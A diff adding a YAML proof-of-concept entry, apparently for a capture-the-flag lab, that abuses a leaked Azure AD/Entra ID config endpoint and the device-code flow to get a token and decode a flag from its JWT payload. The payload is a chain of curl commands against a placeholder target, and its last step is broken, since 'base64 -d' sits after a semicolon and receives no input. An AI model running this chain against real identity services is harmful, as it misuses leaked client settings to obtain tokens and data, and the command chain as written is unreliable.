@@ -1,0 +1,23 @@
+info:
+  name: azure-ad-devicecode-flag-extraction
+  cve: ''
+  summary: Azure AD/Entra ID 自建身份服务的配置泄露 → 设备码认证流 → JWT payload sensitive_data 含 flag
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: Azure AD/Entra ID 自建身份服务的配置泄露 → 设备码认证流 → JWT payload sensitive_data 含
+    flag
+  steps:
+  - GET /api/blob-leak 获取 client_id/tenant_id/scopes
+  - POST devicecode 端点用 client_id+scope 换取 device_code
+  - POST token 端点用 device_code 换 access_token (JWT)
+  - base64url 解码 JWT payload 的第二段
+  - 提取 sensitive_data 字段中的 flag{...} 值并提交
+  payload: curl -s http://TARGET/api/blob-leak; curl -s -X POST http://TARGET/corp-aad-TENANT/oauth2/v2.0/devicecode
+    -d 'client_id=CLIENT_ID&scope=openid profile User.Read'; curl -s -X POST http://TARGET/corp-aad-TENANT/oauth2/v2.0/token
+    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=CLIENT_ID&device_code=DEVICE_CODE"
+    | grep -oP '"access_token":"\K[^"]+' | cut -d. -f2 | tr '_-' '/+'; base64 -d
+  verification: Azure AD/Entra ID 自建身份服务的配置泄露 → 设备码认证流 → JWT payload sensitive_data
+    含 flag
